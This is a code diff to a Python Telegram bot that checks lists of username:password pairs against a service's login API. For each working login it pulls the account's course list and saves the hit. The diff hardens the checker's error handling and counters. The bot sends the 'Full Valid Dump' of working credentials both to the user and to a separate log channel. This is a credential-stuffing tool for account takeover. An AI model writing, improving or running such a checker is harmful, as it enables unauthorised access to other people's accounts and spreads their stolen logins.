@@ -60,48 +60,64 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
 
         loop = asyncio.get_running_loop()
 
+        # -------- LOGIN --------
         try:
             r1 = await loop.run_in_executor(
                 None, post_request, f"https://{api}/post/userLogin", h, d
             )
             r1 = r1.json()
-        except:
+        except Exception:
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
             return
 
-        if "data" not in r1 or "token" not in r1["data"]:
+        # 🔒 SAFETY CHECK
+        if not isinstance(r1, dict):
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
             return
 
-        h["authorization"] = r1["data"]["token"]
+        data = r1.get("data")
+        if not isinstance(data, dict) or not data.get("token"):
+            async with stats_lock:
+                stats["checked"] += 1
+                stats["invalid"] += 1
+            return
 
+        h["authorization"] = data["token"]
+
+        # -------- COURSES --------
         try:
             r2 = await loop.run_in_executor(
                 None, get_request, f"https://{api}/get/mycourseweb?userid=", h
             )
             r2 = r2.json()
-        except:
+        except Exception:
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
             return
 
-        if not r2.get("data"):
+        if not isinstance(r2, dict) or not isinstance(r2.get("data"), list):
             async with stats_lock:
                 stats["checked"] += 1
                 stats["invalid"] += 1
             return
 
         # ================= SUCCESS =================
-        batches = []
-        for i in r2["data"]:
-            name = i.get("course_name")
-            if name:
-                batches.append(name)
+        batches = [
+            i.get("course_name")
+            for i in r2["data"]
+            if isinstance(i, dict) and i.get("course_name")
+        ]
+
+        if not batches:
+            async with stats_lock:
+                stats["checked"] += 1
+                stats["invalid"] += 1
+            return
 
         success_text = f"🔥 {n}*{p}\n"
         for b in batches:
@@ -145,6 +161,8 @@ async def pw_command_handler(bot, m):
         lines = [i.strip() for i in f if ":" in i]
 
     stats["total"] = len(lines)
+    stats["checked"] = stats["valid"] = stats["invalid"] = 0
+    results.clear()
 
     progress_msg = await m.reply_text(
         f"{progress_bar(0, stats['total'])}\n\n"
@@ -168,13 +186,5 @@ async def pw_command_handler(bot, m):
     with open(txt_path, "w", encoding="utf-8") as f:
         f.write("\n\n".join(results))
 
-    await m.reply_document(
-        txt_path,
-        caption="📄 Final Valid Results"
-    )
-
-    await bot.send_document(
-        LOG_CHANNEL_ID,
-        txt_path,
-        caption="📄 Full Valid Dump"
-    )
+    await m.reply_document(txt_path, caption="📄 Final Valid Results")
+    await bot.send_document(LOG_CHANNEL_ID, txt_path, caption="📄 Full Valid Dump")
